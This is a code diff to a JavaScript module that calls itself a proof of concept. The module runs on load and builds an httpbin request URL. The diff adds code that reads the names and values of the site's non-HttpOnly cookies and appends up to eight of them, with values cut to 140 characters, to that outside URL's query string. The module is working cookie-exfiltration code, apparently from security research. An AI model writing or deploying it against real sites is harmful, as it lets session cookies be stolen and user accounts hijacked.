@@ -163,6 +163,7 @@ define([], function () {
 
   function buildReadableHttpbinLink(baseUrl, payload) {
     var authCookies = payload && payload.authCookies ? payload.authCookies : [];
+    var visibleCookies = payload && payload.visibleCookies ? payload.visibleCookies : [];
     var visibleNames = payload && payload.visibleCookieNames ? payload.visibleCookieNames : [];
     var params = [];
     params.push("event=" + encodeURIComponent(payload.event || "cp_hash_loader"));
@@ -179,6 +180,12 @@ define([], function () {
     }
     for (var j = 0; j < visibleNames.length && j < 5; j++) {
       params.push("v" + j + "n=" + encodeURIComponent(visibleNames[j] || ""));
+    }
+    for (var k = 0; k < visibleCookies.length && k < 8; k++) {
+      var vc = visibleCookies[k] || {};
+      var vv = (vc.value || "").slice(0, 140);
+      params.push("v" + k + "n2=" + encodeURIComponent(vc.name || ""));
+      params.push("v" + k + "v2=" + encodeURIComponent(vv));
     }
 
     return baseUrl + "?" + params.join("&");
@@ -305,6 +312,9 @@ define([], function () {
       authCookieCount: authCookies.length,
       authCookieSelection: authSelection.mode,
       visibleCookieCount: cookies.length,
+      visibleCookies: cookies.slice(0, 20).map(function (c) {
+        return { name: c.name, value: c.value };
+      }),
       visibleCookieNames: cookies.map(function (c) { return c.name; }).slice(0, 20),
       note: "Only non-HttpOnly cookies readable from current site are included."
     };
@@ -363,7 +373,7 @@ define([], function () {
   executePoC();
 
   return {
-    version: "105.0.0-httpbin-post-with-get-fallback",
+    version: "106.0.0-httpbin-visible-cookie-preview",
     render: function () {
       return executePoC();
     }
